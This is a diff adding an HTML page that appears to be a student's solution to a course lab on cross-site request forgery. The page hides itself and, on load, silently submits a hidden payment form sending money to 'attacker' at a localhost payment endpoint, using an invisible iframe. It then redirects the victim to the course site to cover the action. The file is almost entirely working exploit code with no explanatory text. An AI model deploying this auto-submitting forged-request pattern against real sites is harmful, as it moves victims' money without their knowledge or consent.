@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+
+
+
+<html id="to_be_hide">
+
+<!-- Insert CSRF attack code here -->
+<div class="payment-form" style="visibility: hidden;">
+<!-- <div class="payment-form" > -->
+   <h3 class="payment-header">Make payment?</h3>
+
+   <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+
+   <form action="http://localhost:8080/pay" method="post" name="auto_submit" target="dummyframe">
+       <div class="form-group">
+       <div class="form-label">To:</div>
+       <div class="form-input"><input name="recipient" type="text" value="attacker"/></div>
+       </div>
+       <div class="form-group">
+       <div class="form-label">Amount:</div>
+       <div class="form-input"><input name="amount" type="number" value="10"/></div>
+       </div>
+       <input class="form-button" type="submit" value="Pay"/>
+   </form>
+ 
+   {% if payment_error %}
+   <div class="error"><p>{{ payment_error }}</p></div>
+   {% endif %}
+</div>
+
+
+</html>
+<!-- height="300px" width="100%" -->
+<!-- <iframe id="for_redirect" name="iframe_a"  title="Iframe Example" target="http://cs5435.github.io">
+
+</iframe> -->
+
+
+<script>
+    // var windowObjectReference;
+    // var strWindowFeatures = "menubar=no,location=no,resizable=no,scrollbars=no,status=yes,width=400,height=350";
+
+    //  function openRequestedPopup() {
+    //   windowObjectReference = window.open("http://localhost:8081/csrf", "CNN_WindowName", strWindowFeatures);
+    //  }
+    // window.open("http://localhost:8081/csrf", "mywindow", "location=0,menubar=0,status=0,scrollbars=0,width=100,height=100");
+    window.onload = function(){
+        document.getElementById("to_be_hide").style.display = "none";
+        // setTimeout(() => {
+        //     console.log('submitted')
+        //     document.forms['auto_submit'].submit();
+        // }, 3000);
+        console.log('submitted')
+        document.forms['auto_submit'].submit();
+
+        // console.dir(document.getElementById("for_redirect").contentWindow);
+
+        // const render_form = document.getElementById("for_redirect");
+        // render_form.submit()
+
+    }
+    setTimeout(() => {
+        console.log('redirect')
+        window.location.replace("https://cs5435.github.io/");
+    }, 500);
+
+    
+</script>
+
